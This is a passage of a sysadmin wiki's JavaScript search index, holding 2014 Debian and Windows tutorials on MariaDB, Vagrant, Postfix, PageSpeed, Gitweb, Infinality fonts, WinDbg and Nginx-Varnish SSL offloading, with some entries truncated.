                content: " Software version 10 Operating System Debian 7 Website MariaDB Website Last Update 01/04/2014 Introduction linkMariaDB is a community-developed fork of the MySQL relational database management system, the impetus being the community maintenance of its free status under the GNU GPL. As a fork of a leading open source software system, it is notable for being led by its original developers and triggered by concerns over direction by an acquiring commercial company Oracle. Contributors are required to share their copyright with Monty Program AB.\nThe intent is also to maintain high compatibility with MySQL, ensuring a “drop-in” replacement capability with library binary equivalency and exacting matching with MySQL APIs and commands. It includes the XtraDB storage engine as a replacement for InnoDB, as well as a new storage engine, Aria, that intends to be both a transactional and non-transactional engine perhaps even included in future versions of MySQL.\nIts lead developer is Michael “Monty” Widenius, the founder of MySQL and Monty Program AB. He had previously sold his company, MySQL AB, to Sun Microsystems for 1 billion USD. MariaDB is named after Monty’s younger daughter, Maria.\nFor a migration from MySQL to MariaDB, it’s recommended to keep the same version (Example: MySQL 5.1 \u0026 MariaDB 5.1). Then you can upgrade to upper versions of MariaDB.\nInstallation linkTo install MariaDB, it’s unfortunately not embedded in Debian, so we’ll add a repository. First of all, install a python tool to get aptkey:\naptitude install python-software-properties Then let’s add this repository (https://downloads.mariadb.org/mariadb/repositories/):\napt-key adv --recv-keys --keyserver keyserver.ubuntu.com 0xcbcb082a1bb943db add-apt-repository 'deb http://mirrors.linsrv.net/mariadb/repo/10.0/debian wheezy main' We’re now going to change apt pinning to prioritize MariaDB’s repository (/etc/apt/preferences.d/mariadb):\nPackage: * Pin: release o=MariaDB Pin-Priority: 1000 You can delete MySQL if it was already installed:\naptitude remove mysql-server mysql-client Then we install MariaDB:\naptitude update aptitude install mariadb-server That’s it, nothing else to do! Your MySQL databases are still accessible like if it was MySQL, but you’re running MariaDB :-)\nReferences link http://mariadb.org/ http://www.skysql.com/ "
            }
        );
    index.add(
            {
                id:  189 ,
                href: "\/Vagrant_:_quickly_deploy_virtual_machines\/",
                title: "Vagrant: Quickly Deploy Virtual Machines",
                description: "Learn how to use Vagrant to easily deploy and manage virtual machines for development and testing environments.",
                content: " Operating System Debian 7 Website Vagrant Website Last Update 13/03/2014 Others VirtualBox Introduction linkVagrant provides easy to configure, reproducible, and portable work environments built on top of industry-standard technology and controlled by a single consistent workflow to help maximize the productivity and flexibility of you and your team.\nTo achieve its magic, Vagrant stands on the shoulders of giants. Machines are provisioned on top of VirtualBox, VMware, AWS, or any other provider. Then, industry-standard provisioning tools such as shell scripts, Chef, or Puppet, can be used to automatically install and configure software on the machine.\nInstallation linkWe need to install these prerequisites in order to install VirtualBox in the desired version:\naptitude install libsdl-ttf2.0-0:amd64 gcc-4.6-base:amd64 cpp-4.6 dkms gcc-4.6 linux-headers-amd64 linux-kbuild-3.2 Then get this VirtualBox and vagrant version to avoid incompatibility issues:\nwget http://download.virtualbox.org/virtualbox/4.2.12/virtualbox-4.2_4.2.12-84980~Debian~wheezy_amd64.deb wget http://files.vagrantup.com/packages/7e400d00a3c5a0fdf2809c8b5001a035415a607b/vagrant_1.2.2_x86_64.deb Usage linkEach created instance should have its own folder. For example you can do this kind of hierarchy:\n. |-- Vagrant | |-- vm1 | |-- vm2 | `-- vm3 Add an image linkThe first thing you have to do is to add an image. You can find several ones here or on the official Vagrant Cloud. Let’s take a Debian Squeeze for example (change squeeze name if you want):\nvagrant box add squeeze http://www.emken.biz/vagrant-boxes/debsqueeze64.box This will download and store the image in ~/.vagrant.d/boxes/.\nHere is a Wheezy image:\nvagrant box add deimosfr/debian-wheezy Or Jessie:\nvagrant box add deimosfr/debian-jessie Deploy an image linkTo deploy a downloaded box image, simply run:\nvagrant init Replace squeeze by the name of the box. This will create a Vagrantfile file.\nStart the image linkTo start an image, it’s simple:\nvagrant up Stop the image linkYou can shutdown:\nvagrant halt Connect to the image linkTo connect through ssh, it’s simple:\nvagrant ssh List all boxes machines linkTo list all available boxes on your machine:\n\u003e vagrant box list squeeze (virtualbox) Plugins linkVirtualBox Guest Additions linkTo avoid reinstalling manually each new version of guests, here is a plugin that will do it for you each time you boot a VM! Install the plugin:\nvagrant plugin install vagrant-vbguest That’s it :). Now start a VM and if VirtualBox Guests Additions are not at the latest version, they will automatically be updated.\nExample linkCeph linkHere is an example for 6 VMs with 2 interfaces (Vagrantfile):\n# -*- mode: ruby -*- # vi: set ft=ruby : ENV['LANG'] = 'C' # Vagrantfile API/syntax version. Don't touch unless you know what you're doing! VAGRANTFILE_API_VERSION = \"2\" # Insert all your Vms with configs boxes = [ { :name =\u003e :mon1, :role =\u003e 'mon'}, { :name =\u003e :mon2, :role =\u003e 'mon'}, { :name =\u003e :mon3, :role =\u003e 'mon'}, { :name =\u003e :osd1, :role =\u003e 'osd', :ip =\u003e '192.168.33.31'}, { :name =\u003e :osd2, :role =\u003e 'osd', :ip =\u003e '192.168.33.32'}, { :name =\u003e :osd3, :role =\u003e 'osd', :ip =\u003e '192.168.33.33'}, ] $install = \u003c"
            }
        );
    index.add(
            {
                id:  190 ,
                href: "\/Postfix:_hold_outgoing_mail_transport\/",
                title: "Postfix: hold outgoing mail transport",
                description: "A guide on how to hold outgoing mail transport in Postfix without stopping the service, allowing time to analyze and troubleshoot mail infrastructure problems.",
                content: " Software version 2.10 Operating System Debian 7 Website Postfix Website Last Update 04/03/2014 Introduction linkWhen you manage Postfix and have a trouble with your mail infrastructure, you may want to set in maintenance your Postfix without stopping the service. Here is a way to hold the queue, giving the time to analyze the problem and then release the queue.\nUsage linkYou need to configure your Postfix as follow (/etc/postfix/main.cf):\ndefer_transports = hold default_transport = hold Then restart Postfix. Once you’re ready and want to release the queue, remove those two previous lines, restart Postfix and force the queue to release:\nservice postfix restart mailq -q You can then look at the current status of deferred mails:\n\u003e qshape deferred T 5 10 20 40 80 160 320 640 1280 1280+ TOTAL 250218 0 0 0 0 151 138 38983 182693 26188 2065 hotmail.fr 116169 0 0 0 0 0 3 18273 88228 9037 628 hotmail.com 45086 0 0 0 0 0 5 3119 31012 10646 304 live.fr 25418 0 0 0 0 0 1 4187 20547 538 145 gmail.com 18519 0 0 0 0 0 4 4448 12874 851 342 yahoo.fr 10174 0 0 0 0 105 4 2227 6785 920 133 msn.com 5833 0 0 0 0 0 1 427 4138 1239 28 laposte.net 3971 0 0 0 0 0 1 956 2633 347 34 free.fr 2501 0 0 0 0 0 0 139 1980 360 22 orange.fr 2382 0 0 0 0 0 0 605 1578 166 33 yahoo.com 1929 0 0 0 0 31 5 188 1428 151 126 voila.fr 1662 0 0 0 0 0 0 120 1231 298 13 sfr.fr 1373 0 0 0 0 0 0 164 1128 66 15 neuf.fr 1295 0 0 0 0 0 0 54 1040 195 6 outlook.fr 1037 0 0 0 0 0 1 383 619 15 19 wanadoo.fr 985 0 0 0 0 0 0 151 542 286 6 live.com 577 0 0 0 0 0 0 81 460 21 15 club-internet.fr 432 0 0 0 0 0 0 9 309 113 1 "
            }
        );
    index.add(
            {
                id:  191 ,
                href: "\/Page_Speed:_optimize_on_the_fly_your_rendered_code\/",
                title: "PageSpeed: Optimize Your Rendered Code On The Fly",
                description: "Learn how to install and configure PageSpeed with Nginx to optimize web content and improve page load times.",
                content: " Software version 1.7.30.3 Operating System Debian 7 Website PageSpeed Website Last Update 19/02/2014 Others Nginx 1.4.4-1 Introduction linkPageSpeed1 speeds up your site and reduces page load time. This open-source webserver module automatically applies web performance best practices to pages and associated assets (CSS, JavaScript, images) without requiring that you modify your existing content or workflow.\nInstallation linkAs Wheezy has an outdated version of Nginx, we’re going to use Nginx extras package with PageSpeed built-in. To get it, we will use the well-known DotDeb repository.\nTo install DotDeb repository, add a preference file to avoid unwanted override packages:\nPackage: * Pin: release o=packages.dotdeb.org Pin-Priority: 100 Then add the repository:\ndeb http://packages.dotdeb.org wheezy all deb-src http://packages.dotdeb.org wheezy all Add the GPG key:\ncd /tmp wget http://www.dotdeb.org/dotdeb.gpg sudo apt-key add dotdeb.gpg And run an update:\napt-get update Then you can install nginx with pagespeed integrated:\naptitude install nginx-extras Configuration linkThe configuration is quite easy but there are lots of options that need to be tested one by one to be sure they have the correct effect:\n# PageSpeed # Enable ngx_pagespeed pagespeed on; pagespeed FileCachePath /usr/share/nginx/pagespeed; # Ensure requests for pagespeed optimized resources go to the pagespeed handler # and no extraneous headers get set. location ~ \"\\.pagespeed\\.([a-z]\\.)?[a-z]{2}\\.[^.]{10}\\.[^.]+\\\" { add_header \"\" \"\"; } location ~ \"^/ngx_pagespeed_static/\" { } location ~ \"^/ngx_pagespeed_beacon$\" { } location /ngx_pagespeed_statistics { allow 127.0.0.1; deny all; } location /ngx_pagespeed_global_statistics { allow 127.0.0.1; deny all; } location /ngx_pagespeed_message { allow 127.0.0.1; deny all; } # Defer and minify Javascript pagespeed EnableFilters defer_javascript; pagespeed EnableFilters rewrite_javascript; pagespeed EnableFilters combine_javascript; pagespeed EnableFilters canonicalize_javascript_libraries; # Inline and minimize css pagespeed EnableFilters rewrite_css; pagespeed EnableFilters fallback_rewrite_css_urls; # Loads CSS faster #pagespeed EnableFilters move_css_above_scripts; pagespeed EnableFilters move_css_to_head; # Rewrite, resize and recompress images pagespeed EnableFilters rewrite_images; # remove tags with default attributes pagespeed EnableFilters elide_attributes; # To enable Varnish pagespeed DownstreamCachePurgeLocationPrefix http://127.0.0.1:80/; pagespeed DownstreamCachePurgeMethod PURGE; pagespeed DownstreamCacheRewrittenPercentageThreshold 95; Then apply this configuration to your desired virtual host:\nserver { listen 80; include pagespeed.conf; [...] And reload Nginx for changes to take effect. You can also enable pagespeed on the server side directly to apply the configuration to all vhosts at once.\nFile path cache optimization linkThe file path cache is used to store rewritten elements. So it’s preferable to have good performance on it, and to achieve this, you can use a tmpfs. Add this line to your fstab:\ntmpfs /usr/share/nginx/pagespeed tmpfs rw,mode=1777,size=512M 0 0 And then create the folder and mount it:\nmkdir /usr/share/nginx/pagespeed mount /usr/share/nginx/pagespeed Restart nginx and it’s ready!\nBenchmark linkSeveral websites exist to benchmark your site and give you recommendations:\nGTMetrix: http://gtmetrix.com Page Speed Insight: http://developers.google.com/speed/pagespeed/insights Then try to correlate with PageSpeed options and you’re now ready to perform tests and see the awesome results!\nReferences link https://developers.google.com/speed/ ↩︎\n"
            }
        );
    index.add(
            {
                id:  192 ,
                href: "\/Gitweb_:_Installation_et_configuration_d\u0027une_interface_web_pour_git\/",
                title: "Gitweb: Installation and configuration of a web interface for git",
                description: "Learn how to install and configure Gitweb, the web interface that allows you to view all commits and comments for git repositories.",
                content: "Introduction linkGitweb is a web interface that allows you to view all commits, comments, etc. for git.\nInstallation linkOn Debian, it’s easy:\napt-get install gitweb Configuration linkPersonally, I use lighttpd, but I’ll try to provide correct configuration for Apache as well.\nWeb Server linkLighttpd linkIf you’re using Lighttpd, make sure the following server modules are loaded:\nmod_cgi mod_redirect Then, create a file for your lighttpd configuration:\n# Gitweb url.redirect += ( \"^/gitweb$\" =\u003e \"http://www.deimos.fr/gitweb/\", ) alias.url += ( \"/gitweb/\" =\u003e \"/usr/lib/cgi-bin/gitweb.cgi\", \"/gitweb.css\" =\u003e \"/usr/share/gitweb/gitweb.css\", \"/git-favicon.png\" =\u003e \"/usr/share/gitweb/git-favicon.png\", \"/git-logo.png\" =\u003e \"/usr/share/gitweb/git-logo.png\", ) $HTTP[\"url\"] =~ \"^/gitweb/\" { setenv.add-environment = ( \"GITWEB_CONFIG\" =\u003e \"/etc/gitweb.conf\", ) cgi.assign = ( \"\" =\u003e \"\" ) } $HTTP[\"host\"] =~ \"^(git|gitweb)\\.(.*)\" { url.redirect = ( \"^/(.*)\" =\u003e \"http://www.%2/gitweb/\" )} Then enable it:\ncd /etc/lighttpd/conf-enabled/ ln -s /etc/lighttpd/conf-available/50-gitweb.conf . Restart or reload your lighttpd server afterward.\nApache linkAnd here’s the configuration for Apache, for those who use it:\nServerName git.example.org DocumentRoot /pub/git SetEnv GITWEB_CONFIG /etc/gitweb.conf RewriteEngine on # make the front page an internal rewrite to the gitweb script RewriteRule ^/$ /cgi-bin/gitweb.cgi # make access for \"dumb clients\" work RewriteRule ^/(.*\\.git/(?!/?(HEAD|info|objects|refs)).*)?$ /cgi-bin/gitweb.cgi%{REQUEST_URI} [L,PT] Or, in the Debian Squeeze version, you can find this:\nAlias /gitweb /usr/share/gitweb Options FollowSymLinks +ExecCGI AddHandler cgi-script .cgi Restart or reload your Apache server afterward.\nNginx linkWith Nginx, you’ll need to authorize certain extensions in php-fpm:\n# In /etc/php5/fpm/pool.d/www.conf [...] security.limit_extensions = .php .php3 .php4 .php5 .cgi [...] And here’s a configuration example to adapt to your needs:\nserver { listen 80; listen 443 ssl; ssl_certificate /etc/nginx/ssl/deimos.fr/server-unified.crt; ssl_certificate_key /etc/nginx/ssl/deimos.fr/server.key; ssl_session_timeout 5m; server_name git.deimos.fr; root /usr/share/gitweb/; access_log /var/log/nginx/git.deimos.fr_access.log; error_log /var/log/nginx/git.deimos.fr_error.log; index gitweb.cgi; location /gitweb.cgi { fastcgi_cache mycache; fastcgi_cache_key $request_method$host$request_uri; fastcgi_cache_valid any 1h; include fastcgi_params; fastcgi_pass unix:/run/fcgiwrap.socket; } } Then we’ll need a cgi wrapper:\naptitude install fcgiwrap Create the link, then reload the configuration:\ncd /etc/nginx/sites-enabled ln -s /etc/nginx/sites-available/git.deimos.fr . /etc/init.d/nginx reload /etc/init.d/fcgiwrap restart /etc/init.d/php5-fpm reload Gitweb linkAdapt this file according to your needs:\n# path to git projects (.git) $projectroot = \"/var/lib/git\"; # directory to use for temp files $git_temp = \"/tmp\"; # target of the home link on top of all pages #$home_link = $my_uri || \"/\"; # html text to include at home page $home_text = \"indextext.html\"; # file with project list; by default, simply scan the projectroot dir. $projects_list = $projectroot; # stylesheet to use $stylesheet = \"/gitweb.css\"; # logo to use $logo = \"/git-logo.png\"; # the 'favicon' $favicon = \"/git-favicon.png\"; # change default git logo url $logo_url = \"http://www.deimos.fr/gitweb\"; $logo_label = \"Deimos.fr Git Repository\"; # This prevents gitweb to show hidden repositories $export_ok = \"git-daemon-export-ok\"; $strict_export = 1; # This lets it make the URLs you see in the header @git_base_url_list = ( 'git://www.deimos.fr/git' ); Restrict access linkIt’s possible to disable access to certain repositories. To do this, enable this in your gitweb configuration:\n$export_ok = \"gitweb-export-ok\"; Then create this file in each repository that you want to display:\ntouch /var/cache/git/git_deimosfr.git/gitweb-export-ok Only repositories with this file will be displayed.\nChange the header linkIf you want to change the header of your gitweb, create an indextext.html file at the location of the cgi and insert HTML code:\nDeimos Git Welcome on my Gitweb. I store here my configurations that I usually use every days.\nOther links:\n- My blog: http://www.deimos.fr/blog\n- My wiki: http://www.deimos.fr/blocnotesinfo\nWeb interface linkYour server is now accessible via the following web interface: http://server/gitweb\nMore attractive theme linkThere is a more attractive theme than the default gitweb theme. Download the archive here and run these commands:\ntar -xzvf kogakure-gitweb-theme.tar.gz cd kogakure-gitweb-theme mv /usr/share/gitweb/gitweb.css /usr/share/gitweb/gitweb-old.css cp gitweb.css /usr/share/gitweb/ cp -Rf img /usr/share/gitweb/ chown -Rf www-data. /usr/share/gitweb/ And there you go, your new theme is in place.\nPiwik integration linkIf you want integration with Piwik, it’s quite simple. I’ve made a patch - you’ll need to modify the JavaScript code to display in your page in this patch:\n*** gitweb.old\t2011-04-05 14:05:06.120951481 +0200 --- gitweb.cgi\t2011-04-05 14:04:41.913944817 +0200 *************** *** 3612,3617 **** --- 3612,3633 ---- qq!\\n!; } + + print \u003c"
            }
        );
    index.add(
            {
                id:  193 ,
                href: "\/Infinality_fonts_for_retina_display\/",
                title: "Infinality fonts for retina display",
                description: "Installing and configuring Infinality fonts for high DPI screens and retina displays on Linux",
                content: " Operating System Debian 8 Website Infinality Website Last Update 17/02/2014 Introduction linkBig resolution with small screens is more and more common and we’re facing a problem on fonts visualization. We have a lot of non adapted fonts for retina display, even if most of them are not so bad. The solution is to install additional fonts to replace the default one. One of the best one I’ve seen is Infinality fonts!\nInstallation linkManual linkClone the git repository:\ncd /tmp git clone https://github.com/chenxiaolong/Debian-Packages.git cd Debian-Packages/ Install the build dependencies. Run the following command and install the packages it lists using apt-get/synaptic/etc.:\naptitude install docbook-to-man libx11-dev x11proto-core-dev libz-dev quilt cd freetype-infinality/ dpkg-checkbuilddeps cd ../fontconfig-infinality/ dpkg-checkbuilddeps Build the packages:\ncd ../freetype-infinality/ ./build.sh cd ../fontconfig-infinality/ ./build.sh Install the deb files:\ncd .. sudo dpkg -i freetype-infinality/*.deb fontconfig-infinality/*.deb With packages linkYou can grab them directly from this site1:\ncd /tmp wget https://dl.dropboxusercontent.com/u/106654446/infinality_jessie/fontconfig-infinality_1-2_all.deb wget https://dl.dropboxusercontent.com/u/106654446/infinality_jessie/freetype-infinality_2.4.9-3_all.deb wget https://dl.dropboxusercontent.com/u/106654446/infinality_jessie/libfreetype-infinality6_2.4.9-3_amd64.deb dpkg -i *.deb Or via the ppa http://ppa.launchpad.net/no1wantdthisname/ppa/ubuntu/[^2]\nSelect your configuration linkSelect the configuration\n\u003e sudo /etc/fonts/infinality/infctl.sh setstyle Select a style: 1) debug 3) linux\t5) osx2\t7) win98 2) infinality 4) osx\t6) win7\t8) winxp #? 3 Restart your session and you’re done :-)\nReferences link http://forums.debian.net/viewtopic.php?f=16\u0026t=88545 ↩︎\n"
            }
        );
    index.add(
            {
                id:  194 ,
                href: "\/WinDbg:_analyze_crash_dump\/",
                title: "WinDbg: Analyze Crash Dump",
                description: "A guide on how to use WinDbg to analyze crash dumps on Windows systems",
                content: " Operating System Windows 2008 R2 Last Update 16/02/2014 Introduction linkWinDbg is a multipurpose debugger for Microsoft Windows, distributed on the web by Microsoft. It can be used to debug user mode applications, drivers, and the operating system itself in kernel mode. It is a GUI application, but it has little in common with the more well-known, but less powerful, Visual Studio Debugger.\nWinDbg can be used for debugging kernel-mode memory dumps, created after what is commonly called the Blue Screen of Death which occurs when a bug check is issued. It can also be used to debug user-mode crash dumps. This is known as post-mortem debugging.\nWinDbg also has the ability to automatically load debugging symbol files (e.g., PDB files) from a server by matching various criteria (e.g., timestamp, CRC, single or multiprocessor version). This is a very helpful and time saving alternative to creating a symbol tree for a debugging target environment. If a private symbol server is configured, the symbols can be correlated with the source code for the binary. This eases the burden of debugging problems that have various versions of binaries installed on the debugging target by eliminating the need for finding and installing specific symbols version on the debug host. Microsoft has a public symbol server that has most of the public symbols for Windows 2000 and later versions of Windows (including service packs).\nRecent versions of WinDbg have been and are being distributed as part of the free Debugging Tools for Windows suite, which shares a common debugging back-end between WinDbg and command line debugger front-ends like KD, CDB, and NTSD. Most commands can be used as is with all the included debugger front-ends.1\nInstallation linkTo get WinDbg working, you need 2 things:\nWinDbg: https://www.microsoft.com/en-us/download/confirmation.aspx?id=8279 Symbols: https://msdn.microsoft.com/en-us/windows/hardware/gg463028 Install them, then add an environment variable with the following:\nVariable name: _NT_SYMBOL_PATH Value: C:\\Symbols Then close your session and login again.\nUsage linkYou’re now ready to use the debugger! Open WinDbg, click on “Open crash dump” and select your “MEMORY.DMP”. Then launch that command:\n!analyze -v ******************************************************************************* * * * Bugcheck Analysis * * * ******************************************************************************* CLOCK_WATCHDOG_TIMEOUT (101) An expected clock interrupt was not received on a secondary processor in an MP system within the allocated interval. This indicates that the specified processor is hung and not processing interrupts. Arguments: Arg1: 0000000000000008, Clock interrupt time out interval in nominal clock ticks. Arg2: 0000000000000000, 0. Arg3: fffff88001f3f180, The PRCB address of the hung processor. Arg4: 0000000000000004, 0. Debugging Details: ------------------ BUGCHECK_STR: CLOCK_WATCHDOG_TIMEOUT_18_PROC DEFAULT_BUCKET_ID: VISTA_DRIVER_FAULT PROCESS_NAME: System CURRENT_IRQL: d STACK_TEXT: fffff800`02bfc2c8 fffff800`01728a89 : 00000000`00000101 00000000`00000008 00000000`00000000 fffff880`01f3f180 : nt!KeBugCheckEx fffff800`02bfc2d0 fffff800`016dbeb7 : fffff980`00000000 fffff800`00000004 00000000`0002625a fffff800`016f11e4 : nt! ?? ::FNODOBFM::`string'+0x4e2e fffff800`02bfc360 fffff800`0161c1c0 : 00000000`00000000 fffff800`02bfc510 fffff800`016383c0 fffff800`00000000 : nt!KeUpdateSystemTime+0x377 fffff800`02bfc460 fffff800`016cdb73 : ffffffff`ffaef08d fffff800`016383c0 fffff800`02bfc6b0 00000000`00000000 : hal!HalpRtcClockInterrupt+0x130 fffff800`02bfc490 fffff800`0161617e : fffff800`01617790 00000000`00000000 fffffa80`491fc840 fffff880`01786ee0 : nt!KiInterruptDispatchNoLock+0x163 fffff800`02bfc628 fffff800`01617790 : 00000000`00000000 fffffa80`491fc840 fffff880`01786ee0 00000000`00000007 : hal!HalpGetPmTimerPerfCounterValue+0x10 fffff800`02bfc630 fffff880`0169e059 : 00000000`00369e99 00000042`2e0a39f7 fffffa80`491e0470 fffff880`0169fe22 : hal!KeQueryPerformanceCounter+0x9c fffff800`02bfc660 fffff880`0169d10a : 00000000`00000018 00000000`00000000 00000000`00000000 00000000`00000005 : tcpip!TcpUpdateMicrosecondCount+0x79 fffff800`02bfc6a0 fffff800`016dd062 : fffff800`02bfc938 00000000`00000000 fffff800`02bfc860 00000000`00000005 : tcpip!TcpPeriodicTimeoutHandler+0x7a fffff800`02bfc7a0 fffff800`016dcf06 : fffff800`018ce080 00000000`001bc201 00000000`00000000 00000000`00000102 : nt!KiProcessTimerDpcTable+0x66 fffff800`02bfc810 fffff800`016dcdee : 00000042`2e0a39f7 fffff800`02bfce88 00000000`001bc201 fffff800`018462a8 : nt!KiProcessExpiredTimerList+0xc6 fffff800`02bfce60 fffff800`016dcbd7 : fffffa80`49767dc7 fffff800`001bc201 00000000`00000000 00000000`00000000 : nt!KiTimerExpiration+0x1be fffff800`02bfcf00 fffff800`016d4165 : 00000000`00000000 fffffa80`48c00680 00000000`00000000 fffff880`00e28a00 : nt!KiRetireDpcList+0x277 fffff800`02bfcfb0 fffff800`016d3f7c : 00000000`00000010 00000000`00000286 fffff880`029e0598 00000000`00000018 : nt!KxRetireDpcList+0x5 fffff880`029e0570 fffff800`0171d453 : fffff800`016cdba0 fffff800`016cdc0c 00000000`17ed5aa0 fffff800`016383c0 : nt!KiDispatchInterruptContinue fffff880`029e05a0 fffff800`016cdc0c : 00000000`17ed5aa0 fffff800`016383c0 00000000`f8d15f7d 00000000`1b7181f5 : nt!KiDpcInterruptBypass+0x13 fffff880`029e05b0 fffff880`01207c47 : 00000000`00000015 00000000`00000000 d4d8e501`cc8cd0a4 669495ef`1e7cdce3 : nt!KiInterruptDispatchNoLock+0x1fc fffff880`029e0740 fffff880`01205616 : fffff880`029e09a0 fffff800`17ed5aa0 00000000`4b38f223 00000000`48bebae9 : cng!SHA256Transform+0x757 fffff880`029e07e0 fffff880`01204eb5 : 00000000`00020000 fffff880`029e0844 fffff8a0`14c840a8 00000000`00000001 : cng!SHA256Update+0x10b fffff880`029e0820 fffff880`012053ed : fffffa80`48f2f060 fffff800`016d99f3 fffffa80`20206f49 fffff8a0`01a08410 : cng!GatherRandomKey+0x255 fffff880`029e0be0 fffff800`019c7f4d : 00000000`00000001 00000000`00000001 fffffa80`4cd15610 fffffa80`48c00680 : cng!scavengingWorkItemRoutine+0x3d fffff880`029e0c80 fffff800`016dba21 : fffff800`0186e600 fffff800`019c7f01 fffffa80`48c00600 00000000`00000000 : nt!IopProcessWorkItem+0x3d fffff880`029e0cb0 fffff800`0196ecce : 00000000`00000000 fffffa80`48c00680 00000000`00000080 fffffa80`48bd1040 : nt!ExpWorkerThread+0x111 fffff880`029e0d40 fffff800`016c2fe6 : fffff880`027b0180 fffffa80`48c00680 fffff880`027bb4c0 00000000`00000000 : nt!PspSystemThreadStartup+0x5a fffff880`029e0d80 00000000`00000000 : fffff880`029e1000 fffff880`029db000 fffff880`029e05b0 00000000`00000000 : nt!KxStartSystemThread+0x16 STACK_COMMAND: kb SYMBOL_NAME: ANALYSIS_INCONCLUSIVE FOLLOWUP_NAME: MachineOwner MODULE_NAME: Unknown_Module IMAGE_NAME: Unknown_Image DEBUG_FLR_IMAGE_TIMESTAMP: 0 FAILURE_BUCKET_ID: X64_CLOCK_WATCHDOG_TIMEOUT_18_PROC_ANALYSIS_INCONCLUSIVE BUCKET_ID: X64_CLOCK_WATCHDOG_TIMEOUT_18_PROC_ANALYSIS_INCONCLUSIVE Followup: MachineOwner --------- It is also possible to get more information by viewing loaded modules:\n0: kd\u003e lmv start end module name fffff800`014e1000 fffff800`014eb000 kdcom (deferred) Image path: kdcom.dll Image name: kdcom.dll Timestamp: Tue Jul 14 03:31:07 2009 (4A5BDFDB) CheckSum: 00009363 ImageSize: 0000A000 Translations: 0000.04b0 0000.04e4 0409.04b0 0409.04e4 fffff800`01608000 fffff800`01651000 hal (pdb symbols) c:\\symbols\\hal.pdb\\A085D08B9C5D4BFDBA48AC285BDA03F22\\hal.pdb Loaded symbol image file: hal.dll Image path: hal.dll Image name: hal.dll Timestamp: Sat Nov 20 14:00:25 2010 (4CE7C669) [...] References linkhttps://www.networkworld.com/news/2005/041105-windows-crash.html\nhttps://en.wikipedia.org/wiki/WinDbg ↩︎\n"
            }
        );
    index.add(
            {
                id:  195 ,
                href: "\/Nginx_%20_Varnish_:_Cache_even_in_HTTPS_by_offloading_SSL\/",
                title: "Nginx + Varnish: Cache even in HTTPS by offloading SSL",
                description: "A guide on configuring Nginx and Varnish to enable HTTPS caching through SSL offloading, including installation, configuration and testing steps.",
                content: " Software version 1.2.1 Operating System Debian 7 Website Nginx Website Varnish Website Last Update 16/01/2014 Introduction linkYou certainly know how that Varnish is a very good caching solution but the major problem is you can’t use it for SSL connections. Fortunately there is a solution called “Offload SSL” which decrypt the SSL, send it to the cache system and return crypted flow. This schema will help you more on understanding the purpose of it:\nHow the thing goes?\nLet’s start with the simplest thing: the non SSL traffic:\nThe client requests data to the Varnish server: If Varnish has information -\u003e it replies directly to the client If Varnish doesn’t have information: It forwards connections to the Nginx in backend which reply to Varnish for caching Send back results to the client For the SSL traffic now:\nThe client request data to the Nginx Frontend with SSL Nginx decrypt SSL traffic and forward the clear traffic to Varnish Varnish check it’s cache and decide to forward to the Nginx backend if data is not in cache Nginx backend reply the required data to Varnish The data in Varnish are sent back to the Nginx Frontend for SSL reencapsulation Nginx Front end send the result to the client Of course you don’t need to have multiple machine to make it work. Here I’m using a single machine and a single Nginx instance listening on 2 different ports.\nInstallation linkYou need to have of course Nginx PHP-FPM and Varnish installed:\naptitude install varnish nginx php5-fpm openssl Then create SSL certificates or install yours:\nmkdir -p /etc/nginx/ssl cd /etc/nginx/ssl openssl req -new -x509 -nodes -out server.crt -keyout server.key Configuration linkNginx linkRegarding the Nginx configuration, here is the configuration for the Frontend (SSL) and the backend (8000) on the same Nginx instance:\n# SSL VirtualHost server { # SSL Listen port listen 443 ssl; # Certificates ssl_certificate /etc/nginx/ssl/server.crt; ssl_certificate_key /etc/nginx/ssl/server.key; # Resumption ssl_session_cache shared:SSL:10m; # Timeout ssl_session_timeout 10m; # Security options ssl_ciphers ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-RC4-SHA:ECDHE-RSA-RC4-SHA:ECDH-ECDSA-RC4-SHA:ECDH-RSA-RC4-SHA:ECDHE-RSA-AES256-SHA:RC4-SHA; ssl_prefer_server_ciphers on; server_name vhost.deimos.fr; # Proxy Pass to Varnish # Add headers to recognize SSL location / { proxy_pass http://127.0.0.1:80; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_set_header X-Forwarded-Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-Proto https; proxy_set_header X-Forwarded-Port 443; proxy_set_header X-Secure on; } } # Clear VirtualHost server { listen 8000; server_name vhost.deimos.fr; root /usr/share/nginx/www/test; index index.php; set_real_ip_from 127.0.0.1; real_ip_header X-Forwarded-For; real_ip_recursive on; access_log /var/log/nginx/vhost.deimos.fr_access.log; error_log /var/log/nginx/vhost.deimos.fr_error.log; location / { try_files $uri $uri/ /index.php?$args; } location ~ \\.php$ { include fastcgi_params; fastcgi_pass 127.0.0.1:9000; fastcgi_intercept_errors on; } } Varnish linkFirst of all, change the configuration to have a cache RAM and listen on 80 port:\n... # Should we start varnishd at boot? Set to \"yes\" to enable. START=yes [...] DAEMON_OPTS=\"-a :80 \\ -b localhost:8000 \\ -S /etc/varnish/secret \\ -p thread_pools=2 \\ -p thread_pool_min=100 \\ -p thread_pool_max=2000 \\ -p thread_pool_add_delay=2 \\ -p session_linger=50 \\ -s malloc,512m\" [...] Then configure the forward to the Nginx backend and elements to cache:\n# This is a basic VCL configuration file for varnish. See the vcl(7) # man page for details on VCL syntax and semantics. # # Default backend definition. Set this to point to your content # server. # # Redirect to Nginx Backend if not in cache backend default { .host = \"127.0.0.1\"; .port = \"8000\"; } acl purge { \"127.0.0.1\"; } # vcl_recv is called whenever a request is received sub vcl_recv { if (req.restarts == 0) { if (req.http.x-forwarded-for) { set req.http.X-Forwarded-For = req.http.X-Forwarded-For + \", \" + client.ip; } else { set req.http.X-Forwarded-For = client.ip; } } if (req.http.X-Real-IP) { set req.http.X-Forwarded-For = req.http.X-Real-IP; } else { set req.http.X-Forwarded-For = client.ip; } # Serve objects up to 2 minutes past their expiry if the backend # is slow to respond. set req.grace = 120s; set req.backend = default; if (!req.http.X-Forwarded-Proto) { set req.http.X-Forwarded-Proto = \"http\"; set req.http.X-Forwarded-Port = \"80\"; set req.http.X-Forwarded-Host = req.http.host; } # This uses the ACL action called \"purge\". Basically if a request to # PURGE the 